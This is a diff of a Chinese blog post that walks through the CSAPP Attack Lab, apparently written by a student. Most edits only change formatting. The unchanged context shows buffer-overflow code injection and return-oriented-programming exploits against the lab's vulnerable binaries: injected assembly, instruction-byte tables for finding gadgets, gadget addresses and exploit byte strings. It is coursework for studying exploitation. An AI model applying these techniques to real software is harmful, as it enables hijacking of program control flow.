@@ -3,6 +3,7 @@ date: 2024-07-25
 title: "CSAPP-Attacklab"
 category: 学习经验
 tags: [lab, CSAPP]
+excerpt: "CSAPP Attacklab"
 ---
 
 # 前言
@@ -56,7 +57,7 @@ tags: [lab, CSAPP]
 我们可以使用gcc编译器，将汇编代码编译成二进制文件，然后使用objdump工具将二进制文件转换成16进制字节码。
 
 例如我们有一个编写好的汇编代码example.s。
-```asm
+```
 # Example of hand-generated assembly code
     pushq $0xabcdef     # Push value onto stack
     addq $17,%rax       # Add 17 to %rax
@@ -128,7 +129,7 @@ c0 17 40 00 00 00 00 00       /* touch1函数的地址(小端序) */
 我们需要在40个字节内完成注入代码的编写。提示中说不要用call和jmp，因为这两个指令的代码较难构造，因**此我们可以使用push和ret指令来实现**。
 
 汇编代码如下：
-```asm
+```
 movq $0x59b997fa,%rdi   #将cookie的值放到%rdi寄存器中
 pushq $0x4017ec         #将touch2的函数地址压栈
 ret                     #跳转到touch2函数
@@ -205,7 +206,7 @@ sprintf将cookie打印成一个十六进制字符串，**根据提示，输出�
 然后我们要想办法将cookie字符串的地址(0x5561dca8)放到%rdi寄存器中，然后调用touch3函数。
 
 编写汇编指令如下：
-```asm
+```
 movq  $0x5561dca8, %rdi  #注入字符串的首地址
 pushq $0x4018fa          #touch3的首地址
 retq
@@ -255,9 +256,10 @@ rtarget程序开启了栈随机化，所以每次运行时栈的位置都是不�
 >- You can do this attack with just two gadgets.
 >- When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.
 
-可能会用到一下两个表格中的指令。
+可能会用到以下两个表格中的指令。
 
 **movq S, D**
+
 |S \ D| %rax     | %rcx     | %rdx     | %rbx     | %rsp     | %rbp     | %rsi     | %rdi    |
 |---- | -------- | -------- | -------- | -------- | -------- | -------- | -------- | --------|
 |%rax | 48 89 c0 | 48 89 c1 | 48 89 c2 | 48 89 c3 | 48 89 c4 | 48 89 c5 | 48 89 c6 | 48 89 c7|
@@ -270,6 +272,7 @@ rtarget程序开启了栈随机化，所以每次运行时栈的位置都是不�
 |%rdi | 48 89 f8 | 48 89 f9 | 48 89 fa | 48 89 fb | 48 89 fc | 48 89 fd | 48 89 fe | 48 89 ff|
 
 **popq R**
+
 |       | %rax | %rcx | %rdx | %rbx | %rsp | %rbp | %rsi | %rdi|
 |-------| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ----|
 |popq __R__ | 58   | 59   | 5a   | 5b   | 5c   | 5d   | 5e   | 5f  |
@@ -277,7 +280,7 @@ rtarget程序开启了栈随机化，所以每次运行时栈的位置都是不�
 由part1.level2可知我们要做的就是将cookie的值放到%rdi寄存器中，然后跳转到touch2函数。
 
 也就是要想办法执行以下汇编指令：
-```asm
+```
 movq $0x59b997fa, %rdi
 pushq $0x4017ec
 retq
@@ -289,7 +292,7 @@ retq
 
 假如在栈上0x59b997fa和0x4017ec按顺序排布，我们可以尝试以下指令。
 
-```asm
+```
 popq %rax         #将栈顶的值弹出到%rax寄存器中
 movq %rax, %rdi   #将%rax寄存器的值复制到%rdi寄存器中
 retq              #将栈顶值作为返回地址，跳转到touch2函数
@@ -309,7 +312,7 @@ objdump -d rtarget > rtarget.d
 ```
 
 在getval_280中，我们发现了一组很有意思的字节
-```asm
+```
 00000000004019ca <getval_280>:
   4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
   4019cf:	c3                   	ret   
@@ -322,7 +325,7 @@ objdump -d rtarget > rtarget.d
 然后我们需要找到一个gadget，将%rax寄存器的值复制到%rdi寄存器中。
 
 可以在getval_273中找到
-```asm
+```
 00000000004019a0 <addval_273>:
   4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
   4019a6:	c3                   	ret    
@@ -333,7 +336,7 @@ objdump -d rtarget > rtarget.d
 后面还刚好跟了一个c3。这正是我们需要的gadget。
 
 最后我们要执行的指令为：
-```asm
+```
 #gadget1, 起始地址0x4019cc
 pop %rax 
 nop
@@ -373,6 +376,7 @@ ec 17 40 00 00 00 00 00 /* touch2的首地址，小端序 */
 ```
 
 ## 2.2: Level 3
+
 >Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
 >
 >Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.
@@ -384,7 +388,7 @@ ec 17 40 00 00 00 00 00 /* touch2的首地址，小端序 */
 总体上思路和part1.level3类似，我们需要将cookie字符串放置到一个安全的位置，然后通过gadget将其放到%rdi寄存器中，然后调用touch3函数。
 
 理想转态下我们可以通过执行以下汇编指令来实现：
-```asm
+```
 movq xxx, %rdi  #注入字符串的首地址
 pushq $0x4018fa          #touch3的首地址
 retq
@@ -483,7 +487,7 @@ ret
 **注意以上两个过程是不可以交换的**，因为在操作途中使用的%edx，%esi，%ecx等寄存器的低32位会导致地址值被截断，导致最后的结果错误。我就是因为这个问题卡了好久。。。
 
 综合一下，最后的汇编指令大致如下：
-```asm
+```
 <gadget2>->0x401aad
 mov %rsp, %rax #rax保存初始栈顶
 nop
